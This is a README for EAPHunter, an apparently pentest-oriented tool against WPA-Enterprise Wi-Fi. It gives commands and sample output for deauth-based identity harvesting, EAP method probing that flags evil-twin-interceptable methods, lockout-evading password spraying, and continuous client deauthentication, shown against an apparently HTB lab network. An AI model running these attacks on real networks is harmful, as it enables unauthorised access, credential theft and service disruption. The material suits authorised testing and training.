# EAPHunter

Four modes for WPA-Enterprise targets: harvest EAP outer identities via deauth,
probe which EAP methods a RADIUS server accepts, spray credentials against the AP,
or continuously deauthenticate clients.

## Requirements

```
pip install scapy cryptography
```

`wpa_supplicant` required for spray mode. `iw` and `ip` required for all modes.

## userenum

Puts the interface into monitor mode and continuously tracks associated clients.
Deauth a client to force an EAP re-authentication and capture the outer identity
and RADIUS server certificate from the handshake.

```
sudo python3 eaphunter.py userenum -e <SSID> -i <interface> [-c <secs>] [-s <secs>] [-o <dir>]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-c` / `--capture` | 20s | Capture window after deauth |
| `-s` / `--scan-time` | 15s | Seconds to scan for AP's BSSID |
| `-o` / `--output` | auto | Output directory |

At the client table, enter a number to target a client, `auto` to cycle all
undeauthed clients automatically (60s apart, ETA shown), or `q` to quit.

**Limitations:** ineffective if PMKID caching is enabled on the AP (clients skip
the full EAP exchange on reconnect) or if clients use anonymous outer identities.

```
  ==============================================================
  EAPHunter  |  HTB-Corp  |  5c:64:f1:c0:10:a1  |  ch 6  |  14:32:09
  ==============================================================
  #      MAC ADDRESS             PWR    PKTS  VENDOR                     STATUS
  ─────  ────────────────────  ─────  ──────  ─────────────────────────  ──────────
  [1]    d4:61:9d:34:a1:02       -48      91  Apple
  [2]    6c:40:08:bb:23:f7       -61     203  Apple
  [3]    00:1b:77:c2:09:ae       -73      44  Intel

  [?] Select [1-3], 'auto', or 'q': 2

  [!] Sending deauth frames  ->  6c:40:08:bb:23:f7
  [+] EAP Identity  : jsmith@htb-corp.local
  [+] Pcap saved: eap_handshake_6c4008bb23f7.pcap  (847 packets)

  Subject    : CN=radius.htb-corp.local,O=HTB Corp,C=US
  Not After  : 2025-01-15 09:00:00
```

Output: `eap_identities.txt`, `eap_server_cert.der/.pem`, `eap_handshake_<mac>.pcap`

---

## authmethods

Probes which EAP methods a RADIUS server accepts for a given identity.
Iterates 18 method/phase2 combinations (EAP-TLS, PEAP, TTLS, EAP-FAST variants)
and reports which are accepted. Use identities captured from `userenum` for
reliable results.

```
sudo python3 eaphunter.py authmethods -e <SSID> -i <interface> \
    [-I <identity>] [--identityfile <file>] \
    [--cleartext] [-o <dir>]
```

`--cleartext` restricts probing to methods that deliver credentials in plaintext
inside the tunnel (PAP, GTC, OTP) — these are interceptable verbatim via evil twin.

```
  --------------------------------------------------------------
  EAP Auth Method Probe  —  HTB-Corp
  --------------------------------------------------------------
  [*] Identity  : jsmith@htb-corp.local
  [*] Interface : wlan0

  [*] EAP-TLS                         … not supported
  [*] EAP-PEAP/MSCHAPv2               … SUPPORTED
  [*] EAP-PEAP/GTC                    … SUPPORTED
  [*] EAP-TTLS/MSCHAPv2               … SUPPORTED
  [*] EAP-TTLS/PAP                    … not supported
  ...

  --------------------------------------------------------------
  Results
  --------------------------------------------------------------
  [+] 3 supported method(s):
    EAP-PEAP/MSCHAPv2
    EAP-PEAP/GTC
    EAP-TTLS/MSCHAPv2
  [+] Results saved: auth_methods_jsmith@htb-corp.local.txt
```

Output: `auth_methods_<identity>.txt`

---

## spray

Authenticates against the AP using PEAP/MSCHAPv2 to validate credentials.
Accepts any combination of single values and wordlists. Spray ordering is
password-outer, users-inner — one password tried against all users before
moving to the next, reducing per-account lockout risk.

```
sudo python3 eaphunter.py spray -e <SSID> -i <interface> \
    [-u <user>]  [-U <userfile>] \
    [-p <pass>]  [-P <passfile>] \
    [-d <delay_secs>] [-o <dir>]
```

Use `-d` to add delay between attempts when lockout thresholds are a concern.

```
  [001/090]  jsmith                        Winter2024!   ->  failed
  [002/090]  jdoe                          Winter2024!   ->  failed
  [003/090]  HTB\administrator             Winter2024!   ->  VALID  <---
  [+] Valid credential: HTB\administrator:Winter2024!
```

Output: `spray_hits.txt`

---

## deauth

Continuously monitors clients on a target AP and sends deauth frames on demand.
No EAP capture — purely for disruption or to trigger reconnects for other tools.

```
sudo python3 eaphunter.py deauth -e <SSID> -i <interface>
sudo python3 eaphunter.py deauth --bssid <BSSID> -c <channel> -i <interface>
```

`--bssid` + `-c` skips the AP scan, useful when BSSID and channel are already known.
Same client table and selection dialogue as userenum. `auto` deauths all observed
clients in random order. `q` to quit.
